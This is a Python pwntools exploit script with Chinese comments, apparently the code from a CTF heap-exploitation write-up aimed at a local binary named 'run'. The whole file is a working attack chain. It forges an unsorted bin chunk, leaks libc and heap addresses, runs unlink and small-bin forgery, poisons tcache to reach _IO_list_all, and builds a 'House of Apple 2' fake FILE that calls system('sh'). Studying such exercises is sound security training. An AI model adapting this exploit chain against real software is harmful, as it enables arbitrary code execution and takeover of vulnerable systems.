from pwn import *

#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']

#简记------------------------------------------------------------------------------------        
rv = lambda x            : io.recv(x)
rl = lambda a=False      : io.recvline(a)
ru = lambda a,b=True     : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sd = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b          : io.sendafter(a,b)
sla = lambda a,b         : io.sendlineafter(a,b)
inter = lambda           : io.interactive()
tob = lambda x: str(x).encode()
#-----------------------------------------------------------------------------------------


# 启动方式----------------------------------------------------
file_name = "./run"
elf=ELF(file_name)
url = ""
port = 0
libc=ELF("/work/learn/io/black/lib/libc.so.6")
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global io
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,26):
            b_string += f"c\n"  
            #17 伪造ub    32apple
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
    if is_start :
        io = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(io,b_string)
        pause()


b_add=0x1315
b_free=0x12AC
b_show=0x1276 
b_scan = 0x1201 
b_slice = [
    b_add,
    b_free
]
io = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) # 直接启动带pie
#debug(b_slice=b_slice,is_pie=0,is_start=1) 
#debug(b_slice = b_slice,is_pie=0,is_start=0) 
#io = remote(url,port)

#----------------------------------------------------------
#0x4020

#常用函数--------------------------------------------------
def get_addr(arch):
    if arch == 64:
        return u64(io.recv(6).ljust(8,b'\x00'))
        #return u64(io.recv()[-8:].ljust(8,b'\x00')) #所有地址只用到6字节
    else:
        return u32(p.recv(4).ljust(4,b'\x00'))
        #return u32(io.recvuntil(b'\xf7')

def add(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Size [1=small / 2=big]: ", tob(size))
    io.sendafter(b"Data: ", content)
 
def show():
    io.sendlineafter(b"> ", b"2")
 # 发送指定数据到io缓冲区
def show2(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2")
 
def show3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"2" + b"\x00")
 
def free():
    io.sendlineafter(b"> ", b"3")
 
def free3(len):
    io.sendlineafter(b"> ", b"0" * (len-1) + b"3")
 
free3(0xd59) # 这一行的作用见上文【伪造Unsorted bin】
 
# 这一部分信息收集见上文【信息收集】
add(1, b"a" * 0x48 + p64(0xd11))
show2(0x1000)
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
log.success(f"libc_base : {libc_base:#x}")
free()
add(1, b"a" * 0x48 + p64(0xcf1))
 
free()
add(2, b"a")
free()
add(1, b"aaaa")
free()
add(2, b"aaaa")
free()
add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
log.success(f"heap_base : {heap_base:#x}")
free()
 
# 见上文【Unlink攻击以及Smallbin伪造攻击实施】
add(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b"a" * 0x10 + p64(0x30) + p64(0xd00))
free()
add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
free()
add(1, flat({
    0x10: 0,
    0x18: 0x91,
    0x20: heap_base + 0x380,
    0x28: libc_base + 0x219ce0,
}, filler=b"\x00"))
 
show2(0x1000)
free()
 
# 见上文【修改Small bin】
add(1, flat({
    0x10 : {
            0x00: 0,
            0x08: 0x91,
            0x10: heap_base + 0x2c0,
            0x18: heap_base + 0x2c0 + 0x30,
             
            0x30: 0,
            0x38: 0x91,
            0x40: heap_base + 0x2c0,
            0x48: heap_base + 0x2c0 + 0x50,
 
            0x50: 0,
            0x58: 0x91,
            0x60: heap_base + 0x2c0 + 0x30,
            0x68: libc_base + 0x219d60
        }
    }
, filler=b"\x00"))
free()
add(2, b"aaaa")
free()
_IO_list_all = libc_base + 0x21a680
#system = 0x50d60 + libc_base
system=libc_base + 0x219ce0  - (0x7ef51f33dcc0-0x7ef51f16b000)+libc.symbols["system"]
fake_file = heap_base + 0x2e0
# 见上文House of apple 2中解释
add(1, b"X"*0x10+p64(0) + p64(0x71) + p64((heap_base + 0x2d0 + 0x70)^((heap_base)>>12)))
free()
# 这里是布置House of apple 2
add(2, flat({
    0x0+0x10: b"  sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^((heap_base)>>12),
}, filler=b"\x00"))
free()
add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0, # jumptable
}, filler=b"\x00"))
free()
print(hex(fake_file))
add(2, p64(fake_file))
log.success(f"system : {system:#x}")

io.sendlineafter(b'> ',b"0")
 
io.interactive()